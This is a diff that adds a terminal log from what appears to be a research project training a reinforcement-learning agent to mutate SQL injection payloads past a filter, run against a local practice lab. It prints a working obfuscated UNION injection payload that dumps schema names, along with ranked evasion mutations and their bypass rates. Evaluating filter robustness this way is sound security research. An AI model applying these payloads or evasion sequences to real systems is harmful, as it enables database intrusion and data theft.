@@ -1,0 +1,147 @@
+ ============================================================
+   TRAINING RESULTS
+  ============================================================
+    Total episodes     : 16121
+    Successful bypass  : 11840 (73.4%)
+    Avg steps (success): 7.25
+
+    Top mutations:
+      null_byte              : 17330
+      case                   : 17257
+      agg_swap               : 16616
+      func_sp_nbsp           : 15237
+      tab_space              : 9893
+
+    Shortest bypass:
+      Steps    : 4
+      Sequence : agg_swap -> case -> null_byte -> tab_space
+      Payload  : -1'%09uNIOn%09DISTINCT%09SelecT%09(sELECT%09JSON_ARRAYAGG(schema_name)%09fRom%09iN
+  FOrMAtIon_SCHEmA.schemata),'SEQSQLI_START','SEQSQLI_END';%00
+  [*] PPO logs saved to results_ppo.json
+
+  ============================================================
+   RQ3 — MUTATION ORDERING ANALYSIS
+  ============================================================
+
+    [1] First-Step Success Rate (which mutation to apply FIRST?)
+    Action                 |     SR |  Succ / Total
+    --------------------------------------------------
+    tab_space              |  95.4% |  3515 /  3686  █████████
+    func_sp_nbsp           |  85.7% |  1821 /  2125  ████████
+    formfeed               |  82.8% |   777 /   938  ████████
+    agg_swap               |  81.8% |  1792 /  2190  ████████
+    null_byte              |  75.4% |   921 /  1221  ███████
+    case                   |  69.6% |   885 /  1271  ██████
+    ident_backtick         |  59.1% |    55 /    93  █████
+    hex_to_char            |  54.7% |  1906 /  3484  █████
+    crlf                   |  51.7% |    15 /    29  █████
+    dbl_url_comment        |  43.3% |    29 /    67  ████
+
+    [2] Top Bigram Sequences (A -> B success rate)
+    Sequence                            |     SR | Count
+    -------------------------------------------------------
+    tab_space -> func_sp_nbsp           |  81.3% |  6189  ████████
+    tab_space -> null_byte              |  77.2% |  1969  ███████
+    func_sp_nbsp -> tab_space           |  76.2% |  2420  ███████
+    tab_space -> agg_swap               |  73.3% |  1679  ███████
+    agg_swap -> tab_space               |  71.0% |  3005  ███████
+    tab_space -> newline                |  70.6% |    34  ███████
+    null_byte -> tab_space              |  70.5% |  1524  ███████
+    tab_space -> case                   |  70.5% |  1454  ███████
+    func_sp_nbsp -> formfeed            |  68.0% |  1253  ██████
+    formfeed -> func_sp_nbsp            |  67.5% |  1328  ██████
+
+    [3] Ordering Effect: A->B  vs  B->A
+    Forward                       SR  |  Reversed                      SR  |   Diff | Matters?
+    --------------------------------------------------------------------------------
+    nested_or -> ver_50000     50.0%  |    ver_50000 -> nested_or      0.0%  |  +50.0% | ✓ YES
+    double_or -> convert_charset  50.0%  |    convert_charset -> double_or   0.0%  |  +50.0% | ✓
+  YES
+    nested_union -> concat_char  50.0%  |    concat_char -> nested_union   0.0%  |  +50.0% | ✓ YES
+    ver_newline -> dot_prefix  50.0%  |    dot_prefix -> ver_newline   0.0%  |  +50.0% | ✓ YES
+    char_split -> hex_to_char  50.0%  |    hex_to_char -> char_split   0.0%  |  +50.0% | ✓ YES
+    tab_space -> newline       70.6%  |    newline -> tab_space       21.7%  |  +48.9% | ✓ YES
+    tab_space -> crlf          54.5%  |    crlf -> tab_space          20.0%  |  +34.5% | ✓ YES
+    ver_50000 -> paren_full    33.3%  |    paren_full -> ver_50000     0.0%  |  +33.3% | ✓ YES
+    hash_nl_all -> concat_char  33.3%  |    concat_char -> hash_nl_all   0.0%  |  +33.3% | ✓ YES
+    tab_space -> func_sp_cmt   33.3%  |    func_sp_cmt -> tab_space    0.0%  |  +33.3% | ✓ YES
+
+    [4] Position Sensitivity (does position in sequence matter?)
+    Action                 |    pos_1 |    pos_2 |   pos_3+ |  Δ(1 vs 2)
+    ----------------------------------------------------------------------
+    paren_full             |    27.3% |     6.9% |     9.9% |     +20.4%
+    plus_sep               |     0.0% |     8.7% |     0.5% |      -8.7%
+    nested_and             |    31.2% |    50.0% |    18.8% |     -18.8%
+    hash_nl                |    10.5% |    18.2% |     1.3% |      -7.7%
+    concat_char            |    33.3% |    16.0% |    14.5% |     +17.3%
+    convert_charset        |    23.8% |    31.0% |    11.2% |      -7.2%
+    hex_encode             |     5.9% |     5.9% |     2.3% |      +0.0%
+    func_sp_nbsp           |    85.7% |    89.8% |    53.8% |      -4.1%
+    func_sp_nl             |     0.0% |     7.1% |     3.0% |      -7.1%
+    keyword_split          |     0.0% |     0.0% |     2.8% |      +0.0%
+    param_pollute          |     0.0% |     0.0% |     0.0% |      +0.0%
+    case                   |    69.6% |    68.6% |    58.8% |      +1.0%
+
+    VERDICT:
+    Ordering matters (≥10% SR gap) in 146 out of 1171 observed pairs.
+    Key pairs where order is critical:
+      nested_or -> ver_50000         SR=50.0%  vs  ver_50000 -> nested_or         SR=0.0%
+      double_or -> convert_charset   SR=50.0%  vs  convert_charset -> double_or   SR=0.0%
+      nested_union -> concat_char    SR=50.0%  vs  concat_char -> nested_union    SR=0.0%
+      ver_newline -> dot_prefix      SR=50.0%  vs  dot_prefix -> ver_newline      SR=0.0%
+      char_split -> hex_to_char      SR=50.0%  vs  hex_to_char -> char_split      SR=0.0%
+
+  [*] Ordering analysis saved to: ordering_ppo.json
+
+  [*] Total HTTP requests: 88730
+  neet@localheart:/mnt/d/Kuliah/RL/SeqSQLi$  python3 -m tools.evaluate_ifnr_spbarc \
+      --method ppo --ppo-model models/ppo_union_stage1.zip \
+      --payloads payloads_union_less1.csv \
+      --url http://localhost:8080/Less-1/ --param id \
+      --max-steps 15 --stochastic --output eval_ppo_union_agg.json
+  [*] Loaded 108 validated payloads
+  /home/neet/.pyenv/versions/3.13.12/lib/python3.13/site-packages/stable_baselines3/common/on_polic
+  MlpPolicy). See https://github.com/DLR-RM/stable-baselines3/issues/1245 for more info. You can
+  pass `device='cpu'` or `export CUDA_VISIBLE_DEVICES=` to force using the CPU.Note: The model will
+  train, but the GPU utilization will be poor and the training might take longer than on CPU.
+    warnings.warn(
+  [*] Method=ppo | max_steps=15 | sampling=stochastic | attempts=1 |
+  target=http://localhost:8080/Less-1/
+    [  10/108] success=10 (initial=0)
+    [  20/108] success=20 (initial=0)
+    [  30/108] success=30 (initial=0)
+    [  40/108] success=40 (initial=0)
+    [  50/108] success=50 (initial=0)
+    [  60/108] success=60 (initial=0)
+    [  70/108] success=70 (initial=0)
+    [  80/108] success=72 (initial=0)
+    [  90/108] success=78 (initial=0)
+    [ 100/108] success=88 (initial=0)
+    [ 108/108] success=96 (initial=0)
+
+  ============================================================
+   RESULTS: method=ppo
+  ============================================================
+    Payloads             : 108
+    Initial bypasses     : 0  (within-run FNR0=0.0000)
+    Total successes      : 96
+    Mutated bypasses     : 96
+    FNR0 (used)          : 0.0000  (measured)
+    MFNR                 : 0.8889
+    IFNR                 : +0.8889
+    SPBARC               : 6.89
+    Inference requests   : 661
+    Training requests    : 0 (reported-only)
+    Wall clock           : 28.3s
+    Report saved to      : eval_ppo_union_agg.json
+  neet@localheart:/mnt/d/Kuliah/RL/SeqSQLi$ python3 -m tools.breakdown_by_tier
+  eval_ppo_union_agg.json
+  == Per-tier breakdown: eval_ppo_union_agg.json ==
+    tier     |  succ /  tot |     SR | via agg_swap
+    ------------------------------------------------
+    trivial  |    36 /   36 | 100.0% |            0
+    medium   |    36 /   36 | 100.0% |           36
+    complex  |    24 /   36 |  66.7% |           24
+    ------------------------------------------------
+    ALL      |    96 /  108 |  88.9% |           60
+  neet@localheart:/mnt/d/Kuliah/RL/SeqSQLi
